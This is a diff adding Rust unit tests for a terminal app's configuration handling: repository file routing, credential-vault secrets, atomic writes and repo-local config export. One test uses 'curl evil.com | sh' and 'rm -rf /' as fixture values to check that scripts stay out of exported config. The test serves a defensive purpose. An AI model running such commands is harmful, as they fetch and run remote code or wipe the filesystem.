+        )
+        .unwrap();
+
+        let first = repository_file_for_build(true, &production_dir, &dev_dir);
+        save_json_config_to_path(&first, &serde_json::json!({"repos": {"/dev-only": {}}})).unwrap();
+
+        let after_restart = repository_file_for_build(true, &production_dir, &dev_dir);
+        assert_eq!(
+            load_json_config_from_path::<serde_json::Value>(&after_restart)["repos"]["/dev-only"],
+            serde_json::json!({})
+        );
+    }
+
+    #[test]
+    fn existing_dev_repositories_take_precedence() {
+        let dir = TempDir::new().unwrap();
+        let production_dir = dir.path().join("production");
+        let dev_dir = dir.path().join("dev");
+        fs::create_dir_all(&production_dir).unwrap();
+        fs::create_dir_all(&dev_dir).unwrap();
+        fs::write(
+            production_dir.join(REPOSITORIES_FILE),
+            br#"{"repos":{"/production":{}}}"#,
+        )
+        .unwrap();
+        let dev_file = dev_dir.join(REPOSITORIES_FILE);
+        fs::write(&dev_file, br#"{"repos":{"/existing-dev":{}}}"#).unwrap();
+
+        let selected = repository_file_for_build(true, &production_dir, &dev_dir);
+        assert_eq!(selected, dev_file);
+        assert_eq!(
+            read_json(&selected)["repos"]["/existing-dev"],
+            serde_json::json!({})
+        );
+        assert!(read_json(&selected)["repos"].get("/production").is_none());
+    }
+
+    #[test]
+    fn release_repositories_stay_shared_and_seed_source_is_not_mutated() {
+        let dir = TempDir::new().unwrap();
+        let production_dir = dir.path().join("production");
+        let dev_dir = dir.path().join("dev");
+        fs::create_dir_all(&production_dir).unwrap();
+        let production_file = production_dir.join(REPOSITORIES_FILE);
+        let production_data = br#"{"repos":{"/shared":{}}}"#;
+        fs::write(&production_file, production_data).unwrap();
+
+        let release_file = repository_file_for_build(false, &production_dir, &dev_dir);
+        assert_eq!(release_file, production_file);
+        assert!(!dev_dir.exists());
+
+        let dev_file = repository_file_for_build(true, &production_dir, &dev_dir);
+        save_json_config_to_path(&dev_file, &serde_json::json!({"repos": {"/dev-only": {}}}))
+            .unwrap();
+        assert_eq!(fs::read(&production_file).unwrap(), production_data);
+    }
+
+    #[test]
+    fn repository_selector_routes_debug_and_release_persistence() {
+        let dir = TempDir::new().unwrap();
+        let production_dir = dir.path().join("production");
+        let home_dir = dir.path().join("home");
+        fs::create_dir_all(&production_dir).unwrap();
+        let production_file = production_dir.join(REPOSITORIES_FILE);
+        let production_data = serde_json::json!({"repos": {"/production": {}}});
+        save_json_config_to_path(&production_file, &production_data).unwrap();
+
+        let debug_file = repository_file_from_home(true, &production_dir, &home_dir);
+        assert_eq!(
+            debug_file,
+            home_dir.join(".tuicommander-dev").join(REPOSITORIES_FILE)
+        );
+        assert_eq!(
+            load_json_config_from_path::<serde_json::Value>(&debug_file),
+            production_data
+        );
+
+        let debug_data = serde_json::json!({"repos": {"/debug": {}}});
+        save_json_config_to_path(&debug_file, &debug_data).unwrap();
+        assert_eq!(
+            load_json_config_from_path::<serde_json::Value>(&debug_file),
+            debug_data
+        );
+
+        let release_file = repository_file_from_home(false, &production_dir, &home_dir);
+        assert_eq!(release_file, production_file);
+        assert_eq!(
+            load_json_config_from_path::<serde_json::Value>(&release_file),
+            production_data
+        );
+    }
+
     #[test]
     fn app_config_round_trip() {
         let dir = TempDir::new().unwrap();
@@ -1620,6 +2289,8 @@ mod tests {
             max_tab_name_length: 40,
             split_tab_mode: SplitTabMode::Unified,
             tab_ordering_mode: TabOrderingMode::TerminalsFirst,
+            tab_cycling_all_types: true,
+            tab_tree_enabled: true,
             auto_show_pr_popover: true,
             prevent_sleep_when_busy: true,
             auto_update_enabled: false,
@@ -1633,6 +2304,7 @@ mod tests {
             suggest_followups: false,
             global_hotkey: Some("CommandOrControl+Shift+T".to_string()),
             copy_on_select: true,
+            osc52_clipboard: true,
             show_last_prompt: false,
             bell_style: "visual".to_string(),
             collapse_tools: true,
@@ -1643,9 +2315,13 @@ mod tests {
             ai_watchers_enabled: false,
             scrollback_reflow: false,
             ai_terminal_mcp_enabled: false,
+            index_strategy: "active_and_switch".to_string(),
             cursor_style: "bar".to_string(),
             terminal_renderer: "webgl".to_string(),
             auto_update_plugins_enabled: false,
+            standby_timeout_minutes: 5,
+            custom_launchers: Vec::new(),
+            inline_blame_enabled: true,
         };
         let loaded: AppConfig = round_trip_in_dir(dir.path(), "config.json", &cfg);
         assert_eq!(loaded.shell.as_deref(), Some("/bin/zsh"));
@@ -1783,6 +2459,108 @@ mod tests {
         assert_eq!(username, "user2");
         // flat field NOT consumed (migration skipped)
         assert!(val.get("remote_access_enabled").is_some());
+    }
+
+    #[test]
+    #[serial_test::serial]
+    fn app_config_secrets_roundtrip_through_credential_vault() {
+        let tmp = TempDir::new().unwrap();
+        let _guard = set_config_dir_override(tmp.path().to_path_buf());
+        let _ = crate::credentials::delete(crate::credentials::Credential::RemoteSessionToken);
+        let _ = crate::credentials::delete(crate::credentials::Credential::RelayToken);
+        let _ = crate::credentials::delete(crate::credentials::Credential::PushVapidPrivateKey);
+
+        let mut cfg = AppConfig::default();
+        cfg.services.auth.session_token = "session-secret".to_string();
+        cfg.services.relay.token = "relay-secret".to_string();
+        cfg.services.push.vapid_private_key = "vapid-secret".to_string();
+        cfg.services.push.vapid_public_key = "vapid-public".to_string();
+
+        save_app_config(cfg).unwrap();
+
+        let disk: serde_json::Value =
+            serde_json::from_str(&fs::read_to_string(tmp.path().join("config.json")).unwrap())
+                .unwrap();
+        assert!(disk.pointer("/services/auth/session_token").is_none());
+        assert_eq!(
+            disk.pointer("/services/auth/session_token_exists"),
+            Some(&serde_json::Value::Bool(true))
+        );
+        assert!(disk.pointer("/services/relay/token").is_none());
+        assert_eq!(
+            disk.pointer("/services/relay/token_exists"),
+            Some(&serde_json::Value::Bool(true))
+        );
+        assert!(disk.pointer("/services/push/vapid_private_key").is_none());
+        assert_eq!(
+            disk.pointer("/services/push/vapid_private_key_exists"),
+            Some(&serde_json::Value::Bool(true))
+        );
+
+        let loaded = load_app_config();
+        assert_eq!(loaded.services.auth.session_token, "session-secret");
+        assert!(loaded.services.auth.session_token_exists);
+        assert_eq!(loaded.services.relay.token, "relay-secret");
+        assert_eq!(loaded.services.relay.token_exists, Some(true));
+        assert_eq!(loaded.services.push.vapid_private_key, "vapid-secret");
+        assert!(loaded.services.push.vapid_private_key_exists);
+    }
+
+    #[test]
+    fn relay_token_exists_omitted_in_json_deserializes_to_none() {
+        // Sanity-check the serde attribute itself: a JSON object that never
+        // mentions "token_exists" must deserialize to `None`, not `Some(false)`.
+        let relay: RelayConfig = serde_json::from_str(
+            r#"{"enabled": true, "url": "wss://relay.example.com", "session_id": "abc"}"#,
+        )
+        .unwrap();
+        assert_eq!(relay.token_exists, None);
+    }
+
+    #[test]
+    fn preserve_redacted_secrets_keeps_relay_token_when_payload_omits_exists_flag() {
+        // DATA-1 regression test: an agent MCP `config/save` (or partial PUT
+        // /config) that never mentions `relay.token_exists` must NOT delete the
+        // stored relay token. Before the fix, `token_exists` was a plain `bool`
+        // that defaulted to `false` on omission, which the old guard read as an
+        // explicit "no token exists" signal and wiped the stored token.
+        let mut current = AppConfig::default();
+        current.services.relay.token = "existing-secret".to_string();
+        current.services.relay.token_exists = Some(true);
+
+        // Simulate a partial payload: caller only touched an unrelated field,
+        // so relay.token / relay.token_exists come back at their JSON defaults
+        // (empty string / None) exactly as `#[serde(default)]` would produce
+        // for a JSON object that omits both keys.
+        let mut incoming = AppConfig::default();
+        assert_eq!(incoming.services.relay.token_exists, None);
+        assert!(incoming.services.relay.token.is_empty());
+
+        preserve_redacted_app_config_secrets(&mut incoming, &current);
+
+        assert_eq!(incoming.services.relay.token, "existing-secret");
+        assert_eq!(incoming.services.relay.token_exists, Some(true));
+    }
+
+    #[test]
+    fn preserve_redacted_secrets_honors_explicit_relay_token_clear() {
+        // The explicit-clear affordance (ServicesTab.tsx sets
+        // `token_exists = v.length > 0` on every keystroke of the bearer-token
+        // input) must keep working: an incoming payload that explicitly says
+        // `token_exists: false` alongside an empty token means "the user
+        // cleared this field" and must NOT be restored from `current`.
+        let mut current = AppConfig::default();
+        current.services.relay.token = "existing-secret".to_string();
+        current.services.relay.token_exists = Some(true);
+
+        let mut incoming = AppConfig::default();
+        incoming.services.relay.token_exists = Some(false);
+        assert!(incoming.services.relay.token.is_empty());
+
+        preserve_redacted_app_config_secrets(&mut incoming, &current);
+
+        assert!(incoming.services.relay.token.is_empty());
+        assert_eq!(incoming.services.relay.token_exists, Some(false));
     }
 
     #[test]
@@ -2003,6 +2781,56 @@ mod tests {
         assert!(!temp.exists());
     }
 
+    #[test]
+    fn persist_atomic_survives_concurrent_writers() {
+        use std::sync::Arc;
+        use std::thread;
+
+        let dir = TempDir::new().unwrap();
+        let target = Arc::new(dir.path().join("concurrent.bin"));
+
+        // Eight writers hammer the SAME target with distinct homogeneous payloads.
+        // With a per-call unique temp name no two writers ever share a temp path,
+        // so every rename atomically installs a fully-written payload. A per-process
+        // temp name (the old bug) would make the writers collide: one truncates the
+        // temp while another renames it, yielding a truncated/interleaved file or a
+        // rename error (panics the thread).
+        let payloads: Vec<Vec<u8>> = (0..8u8).map(|i| vec![b'A' + i; 4096]).collect();
+        let mut handles = Vec::new();
+        for p in payloads.clone() {
+            let target = Arc::clone(&target);
+            handles.push(thread::spawn(move || {
+                for _ in 0..40 {
+                    persist_atomic(&target, &p).unwrap();
+                }
+            }));
+        }
+        for h in handles {
+            h.join().unwrap();
+        }
+
+        // The final file must be exactly one writer's full, homogeneous payload.
+        let content = fs::read(&*target).unwrap();
+        assert_eq!(content.len(), 4096, "file truncated → temp-name collision");
+        let byte = content[0];
+        assert!(
+            payloads.iter().any(|p| p[0] == byte),
+            "file byte {byte} matches no writer"
+        );
+        assert!(
+            content.iter().all(|&b| b == byte),
+            "interleaved content → concurrent-write race"
+        );
+
+        // No temp files left behind by any writer.
+        let leftovers: Vec<_> = fs::read_dir(dir.path())
+            .unwrap()
+            .filter_map(|e| e.ok())
+            .filter(|e| e.file_name().to_string_lossy().contains("tmp."))
+            .collect();
+        assert!(leftovers.is_empty(), "temp files leaked: {leftovers:?}");
+    }
+
     #[cfg(unix)]
     #[test]
     fn save_json_config_sets_restrictive_permissions() {
@@ -2193,6 +3021,7 @@ mod tests {
                 env_flags: HashMap::new(),
                 intent_tab_title: Some(false),
                 suggest_followups: None,
+                hook_instrumentation: None,
             },
         );
         let loaded: AgentsConfig = round_trip_in_dir(dir.path(), "agents.json", &agents);
@@ -2354,7 +3183,8 @@ mod tests {
         assert!(loaded.delete_branch_on_remove);
         assert!(!loaded.auto_archive_merged);
         assert_eq!(loaded.orphan_cleanup, OrphanCleanup::Ask);
-        assert_eq!(loaded.pr_merge_strategy, MergeStrategy::Merge);
+        // squash is the global default; old configs without the field inherit it
+        assert_eq!(loaded.pr_merge_strategy, MergeStrategy::Squash);
         assert_eq!(loaded.after_merge, WorktreeAfterMerge::Archive);
         assert_eq!(loaded.auto_delete_on_pr_close, AutoDeleteOnPrClose::Off);
     }
@@ -2613,6 +3443,147 @@ mod tests {
     }
 
     #[test]
+    fn overlay_repo_local_config_copies_set_fields_preserves_rest() {
+        // base already has a value the per-repo entry leaves as inherit (None)
+        let base = RepoLocalConfig {
+            mcp_upstreams: Some(vec!["github".to_string()]),
+            after_merge: Some(WorktreeAfterMerge::Delete),
+            ..RepoLocalConfig::default()
+        };
+        let entry = RepoSettingsEntry {
+            base_branch: Some("develop".to_string()),
+            copy_ignored_files: Some(true),
+            pr_merge_strategy: Some(MergeStrategy::Squash),
+            // after_merge left None → must NOT clobber base's value
+            ..RepoSettingsEntry::default()
+        };
+
+        let merged = overlay_repo_local_config(base, &entry);
+        // explicit overrides copied
+        assert_eq!(merged.base_branch.as_deref(), Some("develop"));
+        assert_eq!(merged.copy_ignored_files, Some(true));
+        assert_eq!(merged.pr_merge_strategy, Some(MergeStrategy::Squash));
+        // inherit (None) preserved existing base values
+        assert_eq!(merged.after_merge, Some(WorktreeAfterMerge::Delete));
+        assert_eq!(
+            merged.mcp_upstreams.as_deref(),
+            Some(&["github".to_string()][..])
+        );
+        // untouched field stays None
+        assert!(merged.copy_untracked_files.is_none());
+    }
+
+    #[test]
+    fn overlay_repo_local_config_never_includes_scripts() {
+        // RepoSettingsEntry carries script overrides, but RepoLocalConfig has no
+        // script fields — verify the serialized .tuic.json can never leak them.
+        let entry = RepoSettingsEntry {
+            base_branch: Some("main".to_string()),
+            setup_script: Some("curl evil.com | sh".to_string()),
+            run_script: Some("rm -rf /".to_string()),
+            ..RepoSettingsEntry::default()
+        };
+        let merged = overlay_repo_local_config(RepoLocalConfig::default(), &entry);
+        let json = serde_json::to_string(&merged).unwrap();
+        assert!(json.contains("base_branch"));
+        assert!(!json.contains("setup_script"));
+        assert!(!json.contains("run_script"));
+        assert!(!json.contains("evil.com"));
+    }
+
+    #[test]
+    fn repo_local_config_serializes_sparsely() {
+        // Only explicitly-set fields are written; inherit (None) fields are omitted
+        // so the committed .tuic.json stays minimal.
+        let cfg = RepoLocalConfig {
+            base_branch: Some("develop".to_string()),
+            ..RepoLocalConfig::default()
+        };
+        let json = serde_json::to_string(&cfg).unwrap();
+        assert_eq!(json, r#"{"base_branch":"develop"}"#);
+    }
+
+    #[test]
+    fn overlay_then_roundtrip_through_tuic_json() {
+        let dir = TempDir::new().unwrap();
+        let entry = RepoSettingsEntry {
+            base_branch: Some("develop".to_string()),
+            delete_branch_on_remove: Some(false),
+            ..RepoSettingsEntry::default()
+        };
+        let merged = overlay_repo_local_config(RepoLocalConfig::default(), &entry);
+        let json = serde_json::to_string_pretty(&merged).unwrap();
+        fs::write(dir.path().join(".tuic.json"), json).unwrap();
+
+        let reloaded = load_repo_local_config_from_path(dir.path()).unwrap();
+        assert_eq!(reloaded.base_branch.as_deref(), Some("develop"));
+        assert_eq!(reloaded.delete_branch_on_remove, Some(false));
+        assert!(reloaded.copy_ignored_files.is_none());
+    }
+
+    #[test]
+    fn fill_repo_local_defaults_populates_empty_config() {
+        // Regression: a user who relies on global defaults (no per-repo overrides)
+        // must NOT get an empty {} .tuic.json — the export captures the effective
+        // worktree/branch settings sourced from the global defaults.
+        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
+        defaults.base_branch = "develop".to_string();
+        defaults.copy_ignored_files = true;
+        defaults.delete_branch_on_remove = false;
+
+        let filled = fill_repo_local_defaults(RepoLocalConfig::default(), &defaults);
+        assert_eq!(filled.base_branch.as_deref(), Some("develop"));
+        assert_eq!(filled.copy_ignored_files, Some(true));
+        assert_eq!(filled.delete_branch_on_remove, Some(false));
+        assert!(filled.worktree_storage.is_some());
+        assert!(filled.pr_merge_strategy.is_some());
+
+        let json = serde_json::to_string(&filled).unwrap();
+        assert_ne!(json, "{}", "exported config must not be empty");
+        assert!(json.contains("base_branch"));
+    }
+
+    #[test]
+    fn fill_repo_local_defaults_preserves_existing_and_skips_mcp() {
+        // Fields already present in the .tuic.json base (manually set, or a team
+        // value) win over the global default and must not be clobbered.
+        // mcp_upstreams has no global default, so it stays exactly as-is.
+        let base = RepoLocalConfig {
+            base_branch: Some("release".to_string()),
+            mcp_upstreams: Some(vec!["github".to_string()]),
+            ..RepoLocalConfig::default()
+        };
+        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
+        defaults.base_branch = "develop".to_string();
+
+        let filled = fill_repo_local_defaults(base, &defaults);
+        assert_eq!(filled.base_branch.as_deref(), Some("release"));
+        assert_eq!(
+            filled.mcp_upstreams.as_deref(),
+            Some(&["github".to_string()][..])
+        );
+        // A field neither set in base nor overridden gets the global default.
+        assert!(filled.worktree_storage.is_some());
+    }
+
+    #[test]
+    fn export_precedence_per_repo_over_defaults() {
+        // Mirrors save_repo_local_config: fill defaults, then overlay per-repo.
+        // Per-repo override must win; non-overridden fields keep the default.
+        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
+        defaults.base_branch = "develop".to_string();
+        let entry = RepoSettingsEntry {
+            base_branch: Some("feature".to_string()),
+            ..RepoSettingsEntry::default()
+        };
+
+        let base = fill_repo_local_defaults(RepoLocalConfig::default(), &defaults);
+        let merged = overlay_repo_local_config(base, &entry);
+        assert_eq!(merged.base_branch.as_deref(), Some("feature"));
+        assert!(merged.worktree_storage.is_some());
+    }
+
+    #[test]
     #[serial_test::serial]
     fn get_note_images_dir_returns_path() {
         let dir = TempDir::new().unwrap();
@@ -2679,6 +3650,86 @@ mod tests {
                 .is_symlink()
         );
         assert_eq!(fs::read_to_string(dest.join("real.txt")).unwrap(), "hello");
+    }
+
+    #[test]
+    fn resolve_setup_script_per_repo_override() {
+        let mut settings = RepoSettingsMap::default();
+        settings.repos.insert(
+            "/repo".to_string(),
+            RepoSettingsEntry {
+                setup_script: Some("pnpm install".to_string()),
+                ..RepoSettingsEntry::default()
+            },
+        );
+        let defaults = RepoDefaultsConfig::default();
+        assert_eq!(
+            resolve_setup_script_from(&settings, &defaults, "/repo"),
+            Some("pnpm install".to_string()),
+        );
+    }
+
+    #[test]
+    fn resolve_setup_script_falls_through_to_defaults() {
+        let settings = RepoSettingsMap::default();
+        let defaults = RepoDefaultsConfig {
+            setup_script: "npm install".to_string(),
+            ..RepoDefaultsConfig::default()
+        };
+        assert_eq!(
+            resolve_setup_script_from(&settings, &defaults, "/repo"),
+            Some("npm install".to_string()),
+        );
+    }
+
+    #[test]
+    fn resolve_setup_script_empty_override_blocks_default() {
+        let mut settings = RepoSettingsMap::default();
+        settings.repos.insert(
+            "/repo".to_string(),
+            RepoSettingsEntry {
+                setup_script: Some(String::new()),
+                ..RepoSettingsEntry::default()
+            },
+        );
+        let defaults = RepoDefaultsConfig {
+            setup_script: "npm install".to_string(),
+            ..RepoDefaultsConfig::default()
+        };
+        assert_eq!(
+            resolve_setup_script_from(&settings, &defaults, "/repo"),
+            None,
+        );
+    }
+
+    #[test]
+    fn resolve_setup_script_no_config_returns_none() {
+        let settings = RepoSettingsMap::default();
+        let defaults = RepoDefaultsConfig::default();
+        assert_eq!(
+            resolve_setup_script_from(&settings, &defaults, "/repo"),
+            None,
+        );
+    }
+
+    #[test]
+    fn resolve_setup_script_null_override_falls_through() {
+        let mut settings = RepoSettingsMap::default();
+        settings.repos.insert(
+            "/repo".to_string(),
+            RepoSettingsEntry {
+                setup_script: None,
+                ..RepoSettingsEntry::default()
+            },
+        );
+        let defaults = RepoDefaultsConfig {
+            setup_script: "yarn install".to_string(),
+            ..RepoDefaultsConfig::default()
+        };
+        assert_eq!(
+            resolve_setup_script_from(&settings, &defaults, "/repo"),
+            Some("yarn install".to_string()),
+        );
     }
 
     #[test]
